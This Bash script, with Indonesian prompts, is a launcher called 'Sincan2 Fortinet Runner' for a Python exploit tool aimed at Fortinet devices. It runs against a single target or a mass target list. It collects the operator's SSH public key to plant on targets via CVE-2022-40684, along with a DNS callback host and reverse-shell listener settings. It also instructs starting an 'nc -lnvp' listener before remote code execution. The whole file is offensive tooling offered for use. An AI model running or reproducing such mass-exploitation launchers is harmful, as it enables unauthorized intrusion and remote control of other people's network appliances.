#!/bin/bash

# =================================================================
# Sincan2 Fortinet Runner
# Author: MHL TEAM
# Version: 8.0 (Smart Automation)
# Deskripsi: Runner super cerdas yang otomatis mendeteksi kunci SSH
#            dan IP publik, serta memberi konfirmasi sebelum RCE.
# =================================================================

# --- Definisi Warna ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

function show_menu() {
    clear
    echo -e "${BLUE}==================== SINCAN2 FORTINET RUNNER ====================${NC}"
    echo -e ""
    echo -e "  ${CYAN}[1]${NC} 🎯  Mulai Pindai Target Tunggal"
    echo -e "  ${CYAN}[2]${NC} 📂  Mulai Pindai Massal dari File"
    echo -e ""
    echo -e "  ${RED}[3]${NC} 🚪  Keluar"
    echo -e ""
    echo -e "${BLUE}================================================================${NC}"
}

# Fungsi untuk mengumpulkan semua parameter yang mungkin dibutuhkan
function get_all_params() {
    echo ""
    echo -e "${YELLOW}--- Pengaturan Parameter Eksploitasi ---${NC}"
    echo -e "Skrip akan mencoba menjalankan semua tes CVE yang relevan."
    echo -e "Isi parameter di bawah ini atau tekan [ENTER] untuk menggunakan nilai default."
    echo ""
    
    # --- Username admin otomatis ---
    local forti_user="admin"
    echo -e "${GREEN}  -> Username admin target diatur otomatis ke: admin${NC}"

    # --- Otomatisasi Kunci SSH untuk CVE-2022-40684 ---
    local forti_key=""
    local default_ssh_key=""
    if [ -f "$HOME/.ssh/id_rsa.pub" ]; then
        default_ssh_key="$HOME/.ssh/id_rsa.pub"
    elif [ -f "$HOME/.ssh/id_ed25519.pub" ]; then
        default_ssh_key="$HOME/.ssh/id_ed25519.pub"
    fi

    if [ -n "$default_ssh_key" ]; then
        read -p "  -> Kunci SSH publik ditemukan di [$default_ssh_key], gunakan kunci ini? (y/n): " use_default_key
        if [[ "$use_default_key" =~ ^[Yy]$ ]]; then
            forti_key="$default_ssh_key"
            echo -e "${GREEN}  -> Menggunakan kunci default: $forti_key${NC}"
        else
            read -p "  -> Masukkan path manual ke file public key SSH: " forti_key
        fi
    else
        read -p "  -> Kunci SSH default tidak ditemukan. Masukkan path ke file public key SSH: " forti_key
    fi
    echo ""

    # --- Otomatisasi Deteksi IP Publik ---
    local public_ip=""
    echo -e "${CYAN}  -> Mendeteksi IP publik Anda...${NC}"
    # Memeriksa apakah curl terinstall
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}  -> Perintah 'curl' tidak ditemukan. Tidak dapat mendeteksi IP publik secara otomatis.${NC}"
    else
        public_ip=$(curl -s --max-time 5 ifconfig.me)
        if [ -n "$public_ip" ]; then
            echo -e "${GREEN}  -> IP Publik Anda terdeteksi: $public_ip${NC}"
        else
            echo -e "${YELLOW}  -> Gagal mendeteksi IP publik secara otomatis (mungkin tidak ada koneksi internet).${NC}"
        fi
    fi
    echo ""

    # --- Parameter untuk CVE Lainnya dengan default IP publik ---
    local callback_host_prompt="  -> Host untuk DNS callback (misal: xxxx.oastify.com)"
    local reverse_host_prompt="  -> IP listener Anda (untuk Reverse Shell)"
    
    if [ -n "$public_ip" ]; then
        callback_host_prompt+=" [Default: $public_ip]: "
        reverse_host_prompt+=" [Default: $public_ip]: "
    else
        callback_host_prompt+=": "
        reverse_host_prompt+=": "
    fi
    
    read -p "$callback_host_prompt" callback_host
    callback_host=${callback_host:-$public_ip} # Gunakan default jika input kosong

    read -p "$reverse_host_prompt" reverse_host
    reverse_host=${reverse_host:-$public_ip} # Gunakan default jika input kosong
    
    read -p "  -> Port listener Anda (misal: 9898): " reverse_port
    
    # --- Bangun string flag ---
    local flags=""
    if [[ -n "$forti_user" && -n "$forti_key" ]]; then
        flags+="--forti-user \"$forti_user\" --forti-ssh-key \"$forti_key\" "
    fi
    if [[ -n "$callback_host" ]]; then
        flags+="--callback-host \"$callback_host\" "
    fi
    if [[ -n "$reverse_host" && -n "$reverse_port" ]]; then
        flags+="--reverse-host \"$reverse_host\" --reverse-port \"$reverse_port\" "
        # --- Konfirmasi Listener ---
        echo ""
        echo -e "${YELLOW}PERSIAPAN REVERSE SHELL:${NC}"
        echo -e "Skrip akan mencoba eksploitasi yang memerlukan listener."
        echo -e "Pastikan Anda sudah menjalankan perintah berikut di terminal lain:"
        echo -e "${CYAN}nc -lnvp $reverse_port${NC}"
        read -p "Tekan [ENTER] jika listener Anda sudah siap untuk melanjutkan..."
    fi
    
    # Mengembalikan flag melalui variabel global
    export ALL_FLAGS="$flags"
}

# --- Loop Utama Skrip ---
if [ ! -f "sincan2.py" ] || [ ! -f "_exploits.py" ] || [ ! -f "_updates.py" ]; then
    echo -e "${RED}Error: Satu atau lebih file skrip (.py) tidak ditemukan. Pastikan semua file ada.${NC}"; exit 1;
fi

while true; do
    show_menu
    read -p "  Pilih opsi [1-3]: " choice
    case $choice in
        1)
            # Pindai Target Tunggal
            echo -e "\n--- 🎯 Pindai Target Tunggal ---"
            read -p "Masukkan URL target lengkap (contoh: https://192.168.1.99): " target_url
            if [[ -z "$target_url" ]]; then echo -e "${RED}URL tidak boleh kosong!${NC}"; sleep 2; continue; fi
            
            get_all_params
            
            final_command="python3 ./sincan2.py -u \"$target_url\" $ALL_FLAGS"
            echo -e "\n${GREEN}---> Menjalankan perintah:${NC}"
            echo "$final_command"
            eval "$final_command"
            
            echo -e "\nTekan [ENTER] untuk kembali..."
            read
            ;;
        2)
            # Pindai Massal
            echo -e "\n--- 📂 Pindai Massal dari File ---"
            read -p "Masukkan nama file list target (contoh: fortinet_targets.txt): " mass_file
            if [[ ! -f "$mass_file" ]]; then echo -e "${RED}Error: File '$mass_file' tidak ditemukan!${NC}"; sleep 2; continue; fi
            
            read -p "Masukkan port default untuk semua target (misal: 443, 10443): " mass_port
            if [[ -z "$mass_port" ]]; then echo -e "${RED}Error: Port wajib diisi untuk mode massal!${NC}"; sleep 2; continue; fi

            get_all_params

            final_command="python3 ./sincan2.py -f \"$mass_file\" -p \"$mass_port\" $ALL_FLAGS"
            echo -e "\n${GREEN}---> Menjalankan perintah untuk semua target di file:${NC}"
            echo "$final_command"
            eval "$final_command"

            echo -e "\nTekan [ENTER] untuk kembali..."
            read
            ;;
        3)
            echo -e "\n${GREEN}Terima kasih telah menggunakan Sincan2 Runner! Sampai jumpa!${NC}\n"; exit 0 ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid. Silakan coba lagi.${NC}"; sleep 1 ;;
    esac
done
